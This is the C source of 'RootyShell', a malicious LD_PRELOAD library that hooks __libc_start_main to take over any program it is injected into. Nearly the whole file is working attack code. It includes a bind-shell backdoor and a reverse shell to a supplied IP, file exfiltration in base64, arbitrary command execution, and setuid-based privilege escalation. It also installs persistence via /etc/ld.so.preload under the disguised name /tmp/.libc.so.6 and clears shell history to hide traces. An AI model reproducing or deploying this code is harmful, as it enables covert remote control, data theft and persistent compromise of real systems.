/*
* main.c
* Coded by iosmen (c) 2025
* adding new features for binary
*/
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <signal.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <pwd.h>
#include <grp.h>
#include <sys/utsname.h>
#include <sys/sysinfo.h>

#define GREEN   "\x1b[32m"
#define RED     "\x1b[31m"
#define BLUE    "\x1b[34m"
#define CYAN    "\x1b[36m"
#define YELLOW  "\x1b[33m"
#define MAGENTA "\x1b[35m"
#define RESET   "\x1b[0m"

static int message_shown = 0;
static int privilege_escalated = 0;
static int (*real_main)(int, char**, char**) = NULL;

void print_status(const char* message) { printf(CYAN "[*] %s\n" RESET, message); }
void print_error(const char* message) { printf(RED "[-] %s\n" RESET, message); }
void print_success(const char* message) { printf(GREEN "[+] %s\n" RESET, message); }
void print_warning(const char* message) { printf(YELLOW "[!] %s\n" RESET, message); }
void print_info(const char* message) { printf(BLUE "[i] %s\n" RESET, message); }

int check_command_available(const char* cmd) {
    char check_cmd[256];
    snprintf(check_cmd, sizeof(check_cmd), "command -v %s > /dev/null 2>&1", cmd);
    return system(check_cmd) == 0;
}

void execute_command_silent(const char* cmd) {
    int result = system(cmd);
    if (result != 0) {
    }
}

void get_system_info() {
    printf(MAGENTA "\n╔════════════════ SYSTEM INFO ════════════════╗\n" RESET);
    
    char buffer[512];
    FILE *fp;
    struct utsname uname_data;
    struct sysinfo sys_info;
    
    if (uname(&uname_data) == 0) {
        snprintf(buffer, sizeof(buffer), "%s %s %s", 
                 uname_data.sysname, uname_data.release, uname_data.machine);
        printf(MAGENTA "║ System: %-36s ║\n" RESET, buffer);
    }
    
    int cpu_found = 0;
    fp = fopen("/proc/cpuinfo", "r");
    if (fp) {
        while (fgets(buffer, sizeof(buffer), fp)) {
            if (strstr(buffer, "model name")) {
                char *colon = strchr(buffer, ':');
                if (colon) {
                    colon++;
                    while (*colon == ' ' || *colon == '\t') colon++;
                    colon[strcspn(colon, "\n")] = 0;
                    if (strlen(colon) > 35) {
                        colon[32] = '.';
                        colon[33] = '.';
                        colon[34] = '.';
                        colon[35] = '\0';
                    }
                    printf(MAGENTA "║ CPU: %-39s ║\n" RESET, colon);
                    cpu_found = 1;
                    break;
                }
            }
        }
        fclose(fp);
    }
    
    if (!cpu_found) {
        printf(MAGENTA "║ CPU: %-39s ║\n" RESET, "Unknown");
    }
    
    long cores = sysconf(_SC_NPROCESSORS_ONLN);
    if (cores > 0) {
        snprintf(buffer, sizeof(buffer), "%ld", cores);
        printf(MAGENTA "║ Cores: %-37s ║\n" RESET, buffer);
    } else {
        printf(MAGENTA "║ Cores: %-37s ║\n" RESET, "Unknown");
    }
    
    printf(MAGENTA "║ Arch: %-38s ║\n" RESET, uname_data.machine);
    
    if (sysinfo(&sys_info) == 0) {
        double total_mem = (double)sys_info.totalram * sys_info.mem_unit / (1024*1024*1024);
        snprintf(buffer, sizeof(buffer), "%.1f GB", total_mem);
        printf(MAGENTA "║ Memory: %-36s ║\n" RESET, buffer);
    } else {
        printf(MAGENTA "║ Memory: %-36s ║\n" RESET, "Unknown");
    }
    
    fp = popen("df -h / 2>/dev/null | tail -1 | awk '{print $2 \" free: \" $4}' 2>/dev/null", "r");
    if (fp) {
        if (fgets(buffer, sizeof(buffer), fp)) {
            buffer[strcspn(buffer, "\n")] = 0;
            printf(MAGENTA "║ Disk: %-38s ║\n" RESET, buffer);
        } else {
            printf(MAGENTA "║ Disk: %-38s ║\n" RESET, "Unknown");
        }
        pclose(fp);
    } else {
        printf(MAGENTA "║ Disk: %-38s ║\n" RESET, "Unknown");
    }
    
    int gpu_found = 0;
    fp = popen("lspci 2>/dev/null | grep -i 'vga\\|3d\\|display' | head -1 | cut -d: -f3- | sed 's/^[ \\t]*//' 2>/dev/null", "r");
    if (fp) {
        if (fgets(buffer, sizeof(buffer), fp)) {
            buffer[strcspn(buffer, "\n")] = 0;
            if (strlen(buffer) > 0) {
                if (strlen(buffer) > 35) {
                    buffer[32] = '.';
                    buffer[33] = '.';
                    buffer[34] = '.';
                    buffer[35] = '\0';
                }
                printf(MAGENTA "║ GPU: %-39s ║\n" RESET, buffer);
                gpu_found = 1;
            }
        }
        pclose(fp);
    }
    if (!gpu_found) {
        printf(MAGENTA "║ GPU: %-39s ║\n" RESET, "Not detected");
    }
    
    const char *user = getenv("USER");
    if (!user) user = getenv("USERNAME");
    if (!user) user = "unknown";
    printf(MAGENTA "║ User: %-37s ║\n" RESET, user);
    
    if (gethostname(buffer, sizeof(buffer)) == 0) {
        printf(MAGENTA "║ Host: %-38s ║\n" RESET, buffer);
    } else {
        printf(MAGENTA "║ Host: %-38s ║\n" RESET, "unknown");
    }
    
    if (getcwd(buffer, sizeof(buffer))) {
        char display_path[40];
        if (strlen(buffer) > 35) {
            snprintf(display_path, sizeof(display_path), "...%s", buffer + strlen(buffer) - 32);
        } else {
            strncpy(display_path, buffer, sizeof(display_path));
        }
        printf(MAGENTA "║ Path: %-37s ║\n" RESET, display_path);
    }
    
    fp = fopen("/proc/uptime", "r");
    if (fp) {
        double uptime_seconds;
        if (fscanf(fp, "%lf", &uptime_seconds) == 1) {
            int days = (int)(uptime_seconds / 86400);
            int hours = (int)((uptime_seconds - (days * 86400)) / 3600);
            int minutes = (int)((uptime_seconds - (days * 86400) - (hours * 3600)) / 60);
            
            if (days > 0) {
                snprintf(buffer, sizeof(buffer), "%d days %d hours %d minutes", days, hours, minutes);
            } else if (hours > 0) {
                snprintf(buffer, sizeof(buffer), "%d hours %d minutes", hours, minutes);
            } else {
                snprintf(buffer, sizeof(buffer), "%d minutes", minutes);
            }
            printf(MAGENTA "║ Uptime: %-35s ║\n" RESET, buffer);
        } else {
            printf(MAGENTA "║ Uptime: %-35s ║\n" RESET, "Unknown");
        }
        fclose(fp);
    } else {
        printf(MAGENTA "║ Uptime: %-35s ║\n" RESET, "Unknown");
    }
    
    printf(MAGENTA "╚══════════════════════════════════════════════════╝\n" RESET);
}

int escalate_privileges_silent() {
    uid_t current_uid = getuid();
    uid_t current_euid = geteuid();
    
    if (current_uid == 0 && current_euid == 0) {
        return 1;
    }
    
    if (current_uid != 0 && setuid(0) == 0) {
        return 1;
    }
    
    if (current_euid != 0 && seteuid(0) == 0) {
        return 1;
    }
    
    if (setreuid(0, 0) == 0) {
        return 1;
    }
    
    return 0;
}

int escalate_privileges() {
    if (privilege_escalated) {
        return 1;
    }
    
    uid_t current_uid = getuid();
    uid_t current_euid = geteuid();
    
    if (current_uid == 0 && current_euid == 0) {
        print_success("Already running as root");
        privilege_escalated = 1;
        return 1;
    }
    
    print_status("Attempting privilege escalation...");
    
    int success = 0;
    
    if (current_uid != 0) {
        if (setuid(0) == 0) {
            print_success("Successfully setuid(0)");
            success = 1;
        }
    }
    
    if (!success && current_euid != 0) {
        if (seteuid(0) == 0) {
            print_success("Successfully seteuid(0)");
            success = 1;
        }
    }
    
    if (!success && setreuid(0, 0) == 0) {
        print_success("Successfully setreuid(0, 0)");
        success = 1;
    }
    
    if (!success) {
        print_warning("Could not escalate privileges");
    } else {
        privilege_escalated = 1;
    }
    
    return success;
}

int create_backdoor(int port, const char* ip) {
    int sockfd, clientfd;
    struct sockaddr_in addr;
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        print_error("Socket creation failed");
        return -1;
    }
    
    int opt = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    if (bind(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        print_error("Bind failed");
        close(sockfd);
        return -1;
    }
    
    if (listen(sockfd, 10) < 0) {
        print_error("Listen failed");
        close(sockfd);
        return -1;
    }
    
    print_success("Backdoor started successfully");
    printf(CYAN "[*] Listening on: %s:%d\n" RESET, ip, port);
    printf(CYAN "[*] Connect with: nc %s %d\n" RESET, ip, port);
    
    while (1) {
        clientfd = accept(sockfd, NULL, NULL);
        if (clientfd < 0) {
            if (errno != EINTR) {
                print_error("Accept failed");
            }
            continue;
        }
        
        print_success("New connection accepted!");
        
        pid_t pid = fork();
        if (pid == 0) {
            close(sockfd);
            
            dup2(clientfd, 0);
            dup2(clientfd, 1);
            dup2(clientfd, 2);
            
            // Sessiz privilege escalation - mesaj gösterme
            escalate_privileges_silent();
            
            char *shell = "/bin/bash";
            char *argv[] = {shell, "-i", NULL};
            char *envp[] = {"TERM=xterm-256color", "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
            
            print_status("Spawning shell...");
            execve(shell, argv, envp);
            
            exit(0);
        } else if (pid > 0) {
            close(clientfd);
        }
    }
    
    close(sockfd);
    return 0;
}

void reverse_shell(const char* ip, int port) {
    int sockfd;
    struct sockaddr_in addr;
    
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        print_error("Socket creation failed");
        return;
    }
    
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    
    if (inet_pton(AF_INET, ip, &addr.sin_addr) <= 0) {
        print_error("Invalid IP address");
        close(sockfd);
        return;
    }
    
    print_status("Connecting...");
    printf(CYAN "[*] Target: %s:%d\n" RESET, ip, port);
    
    if (connect(sockfd, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        print_success("Connected!");
        
        dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);
        
        // Sessiz privilege escalation - mesaj gösterme
        escalate_privileges_silent();
        
        char *shell = "/bin/bash";
        char *argv[] = {shell, "-i", NULL};
        execve(shell, argv, NULL);
    } else {
        print_error("Connection failed");
    }
    close(sockfd);
}

int safe_system(const char* command) {
    pid_t pid = fork();
    if (pid == 0) {
        // LD_PRELOAD'u tamamen temizle
        unsetenv("LD_PRELOAD");
        unsetenv("LD_LIBRARY_PATH");
        
        // Standard file descriptor'ları kontrol et
        if (fcntl(0, F_GETFD) == -1) {
            int null_fd = open("/dev/null", O_RDWR);
            if (null_fd != -1) {
                dup2(null_fd, 0);
                close(null_fd);
            }
        }
        
        char *args[] = {"/bin/sh", "-c", (char*)command, NULL};
        execv("/bin/sh", args);
        
        // Eğer execv başarısız olursa
        _exit(127);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status)) {
            return WEXITSTATUS(status);
        } else if (WIFSIGNALED(status)) {
            return 128 + WTERMSIG(status);
        } else {
            return -1;
        }
    } else {
        return -1;
    }
}

void execute_system_command(const char* command) {
    print_status("Executing system command...");
    printf(CYAN "[*] %s\n" RESET, command);
    safe_system(command);
}

void file_operations(const char* operation, const char* file1, const char* format) {
    if (strcmp(operation, "download") == 0 || strcmp(operation, "view") == 0) {
        if (access(file1, F_OK) != 0) {
            print_error("File not found");
            return;
        }
        
        if (format == NULL || strcmp(format, "-txt") == 0) {
            print_status("Viewing file as text...");
            printf(CYAN "[*] File content (text):\n" RESET);
            FILE *file = fopen(file1, "r");
            if (file) {
                char line[1024];
                while (fgets(line, sizeof(line), file)) {
                    printf("%s", line);
                }
                fclose(file);
            } else {
                print_error("Failed to read file");
            }
        }
        else if (strcmp(format, "-64") == 0) {
            print_status("Viewing file as base64...");
            printf(CYAN "[*] File content (base64):\n" RESET);
            pid_t pid = fork();
            if (pid == 0) {
                unsetenv("LD_PRELOAD");
                unsetenv("LD_LIBRARY_PATH");
                char *args[] = {"base64", (char*)file1, NULL};
                execvp("base64", args);
                _exit(1);
            } else if (pid > 0) {
                waitpid(pid, NULL, 0);
            } else {
                print_error("Fork failed");
            }
        }
        else if (strcmp(format, "-all") == 0) {
            print_status("Viewing file in both formats...");
            
            printf(CYAN "[*] File content (text):\n" RESET);
            FILE *file = fopen(file1, "r");
            if (file) {
                char line[1024];
                while (fgets(line, sizeof(line), file)) {
                    printf("%s", line);
                }
                fclose(file);
            } else {
                print_error("Failed to read file as text");
            }
            
            printf(CYAN "\n[*] File content (base64):\n" RESET);
            pid_t pid = fork();
            if (pid == 0) {
                unsetenv("LD_PRELOAD");
                unsetenv("LD_LIBRARY_PATH");
                char *args[] = {"base64", (char*)file1, NULL};
                execvp("base64", args);
                _exit(1);
            } else if (pid > 0) {
                waitpid(pid, NULL, 0);
            } else {
                print_error("Fork failed");
            }
        }
        else {
            print_status("Viewing file...");
            printf(CYAN "[*] File content:\n" RESET);
            FILE *file = fopen(file1, "r");
            if (file) {
                char line[1024];
                while (fgets(line, sizeof(line), file)) {
                    printf("%s", line);
                }
                fclose(file);
            } else {
                print_error("Failed to read file");
            }
        }
    }
}

void persistence_module() {
    print_status("Installing persistence...");
    
    execute_command_silent("cp ./libbinaryinject.so /tmp/.libc.so.6");
    execute_command_silent("chmod +x /tmp/.libc.so.6");
    execute_command_silent("echo 'LD_PRELOAD=/tmp/.libc.so.6' >> ~/.bashrc");
    execute_command_silent("echo '/tmp/.libc.so.6' >> /etc/ld.so.preload");
    
    print_success("Persistence installed");
}

void network_recon(const char* target) {
    print_status("Starting network reconnaissance...");
    
    if (check_command_available("nmap")) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "nmap -sS %s", target);
        printf(CYAN "[*] Running: %s\n" RESET, cmd);
        safe_system(cmd);
    } else if (check_command_available("ping")) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "ping -c 4 %s", target);
        printf(CYAN "[*] Running: %s\n" RESET, cmd);
        safe_system(cmd);
    } else {
        print_error("No network tools available");
    }
}

void stealth_mode() {
    print_status("Enabling stealth mode...");
    execute_command_silent("history -c");
    print_success("Stealth mode activated");
}

void cleanup_traces() {
    print_status("Cleaning up traces...");
    execute_command_silent("history -c");
    print_success("Traces cleaned");
}

int execute_shell_command(const char* command) {
    pid_t pid = fork();
    if (pid == 0) {
        // Çocuk process'te LD_PRELOAD'u tamamen temizle
        unsetenv("LD_PRELOAD");
        unsetenv("LD_LIBRARY_PATH");
        
        // File descriptor'ları kontrol et
        if (fcntl(0, F_GETFD) == -1) open("/dev/null", O_RDWR);
        if (fcntl(1, F_GETFD) == -1) open("/dev/null", O_RDWR);
        if (fcntl(2, F_GETFD) == -1) open("/dev/null", O_RDWR);
        
        char *args[] = {"/bin/sh", "-c", (char*)command, NULL};
        execv("/bin/sh", args);
        _exit(127);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status)) {
            return WEXITSTATUS(status);
        } else if (WIFSIGNALED(status)) {
            return 128 + WTERMSIG(status);
        } else {
            return -1;
        }
    } else {
        return -1;
    }
}

void show_help() {
    printf("\n╔══════════════════════════════════════╗\n");
    printf("║              ROOTYSHELL              ║\n");
    printf("║              BY IOSMEN               ║\n");
    printf("╚══════════════════════════════════════╝\n");
    
    printf("\nCORE COMMANDS:\n");
    printf("  -tcp <port> [ip]          Start TCP backdoor listener\n");
    printf("  -reverse <ip> <port>      Connect reverse shell\n");
    printf("  -giveshell -open -p PORT  Start persistent backdoor server\n");
    printf("  -giveshell -connect IP -p PORT  Connect to backdoor server\n");
    printf("  -giveshell -close         Stop backdoor server\n");
    
    printf("\nFILE OPERATIONS:\n");
    printf("  -download <file>          Download file (text format)\n");
    printf("  -download <file> -txt     Download file as text only\n");
    printf("  -download <file> -64      Download file as base64 only\n");
    printf("  -download <file> -all     Download file in both formats\n");
    printf("  -view <file>              View file contents (text format)\n");
    printf("  -view <file> -txt         View file as text only\n");
    printf("  -view <file> -64          View file as base64 only\n");
    printf("  -view <file> -all         View file in both formats\n");
    
    printf("\nSYSTEM COMMANDS:\n");
    printf("  -exec <command>           Execute system command\n");
    printf("  -persist                  Install persistence\n");
    printf("  -stealth                  Enable stealth mode\n");
    printf("  -cleanup                  Clean up traces\n");
    printf("  -info                     Show system information\n");
    printf("  -escalate                 Attempt privilege escalation\n");
    printf("  -scan <target>            Network reconnaissance\n");
    printf("  --help                    Show this help\n\n");
}

int hooked_main(int argc, char** argv, char** envp) {
    int command_executed = 0;
    
    for(int i = 1; i < argc; i++) {
        if(strcmp(argv[i], "-tcp") == 0 && i+1 < argc) {
            int port = atoi(argv[i+1]);
            const char* ip = (i+2 < argc) ? argv[i+2] : "0.0.0.0";
            if (port > 0 && port < 65536) {
                create_backdoor(port, ip);
                command_executed = 1;
            }
            break;
        }
        else if(strcmp(argv[i], "-reverse") == 0 && i+2 < argc) {
            reverse_shell(argv[i+1], atoi(argv[i+2]));
            command_executed = 1;
            break;
        }
        else if(strcmp(argv[i], "-giveshell") == 0) {
            if (i+1 < argc && strcmp(argv[i+1], "-open") == 0) {
                int port = (i+3 < argc && strcmp(argv[i+2], "-p") == 0) ? atoi(argv[i+3]) : 31337;
                create_backdoor(port, "0.0.0.0");
                command_executed = 1;
                break;
            } else if (i+1 < argc && strcmp(argv[i+1], "-connect") == 0 && i+4 < argc) {
                const char* ip = argv[i+2];
                int port = (strcmp(argv[i+3], "-p") == 0) ? atoi(argv[i+4]) : 31337;
                reverse_shell(ip, port);
                command_executed = 1;
                break;
            } else if (i+1 < argc && strcmp(argv[i+1], "-close") == 0) {
                print_status("Stopping backdoor server...");
                safe_system("pkill -f 'libbinaryinject'");
                command_executed = 1;
                break;
            }
        }
        else if(strcmp(argv[i], "-exec") == 0 && i+1 < argc) {
            execute_system_command(argv[i+1]);
            command_executed = 1;
            i++;
        }
        else if(strcmp(argv[i], "-download") == 0 && i+1 < argc) {
            const char* format = NULL;
            if (i+2 < argc) {
                if (strcmp(argv[i+2], "-txt") == 0 || strcmp(argv[i+2], "-64") == 0 || strcmp(argv[i+2], "-all") == 0) {
                    format = argv[i+2];
                }
            }
            file_operations("download", argv[i+1], format);
            command_executed = 1;
            if (format) i++;
            i++;
        }
        else if(strcmp(argv[i], "-view") == 0 && i+1 < argc) {
            const char* format = NULL;
            if (i+2 < argc) {
                if (strcmp(argv[i+2], "-txt") == 0 || strcmp(argv[i+2], "-64") == 0 || strcmp(argv[i+2], "-all") == 0) {
                    format = argv[i+2];
                }
            }
            file_operations("view", argv[i+1], format);
            command_executed = 1;
            if (format) i++;
            i++;
        }
        else if(strcmp(argv[i], "-persist") == 0) {
            persistence_module();
            command_executed = 1;
        }
        else if(strcmp(argv[i], "-scan") == 0 && i+1 < argc) {
            network_recon(argv[i+1]);
            command_executed = 1;
            i++;
        }
        else if(strcmp(argv[i], "-stealth") == 0) {
            stealth_mode();
            command_executed = 1;
        }
        else if(strcmp(argv[i], "-cleanup") == 0) {
            cleanup_traces();
            command_executed = 1;
        }
        else if(strcmp(argv[i], "-info") == 0) {
            get_system_info();
            command_executed = 1;
        }
        else if(strcmp(argv[i], "-escalate") == 0) {
            escalate_privileges();
            command_executed = 1;
        }
        else if(strcmp(argv[i], "--help") == 0) {
            show_help();
            command_executed = 1;
            break;
        }
    }
    
    if (command_executed) {
        exit(0);
    }
    
    if(real_main) {
        return real_main(argc, argv, envp);
    }
    return 0;
}

__attribute__((constructor)) void init() {
    if (!message_shown) {
        printf(RED "INJECTED BY IOSMEN - RootyShell Active!\n" RESET);
        message_shown = 1;
    }
}

int __libc_start_main(
    int (*main)(int, char**, char**),
    int argc,
    char** argv,
    int (*init)(int, char**, char**),
    void (*fini)(void),
    void (*rtld_fini)(void),
    void* stack_end) {
    
    int (*original_libc_start_main)(
        int (*)(int, char**, char**),
        int, char**, 
        int (*)(int, char**, char**),
        void (*)(void), 
        void (*)(void),
        void*) = dlsym(RTLD_NEXT, "__libc_start_main");
    
    real_main = main;
    
    return original_libc_start_main(hooked_main, argc, argv, init, fini, rtld_fini, stack_end);

}
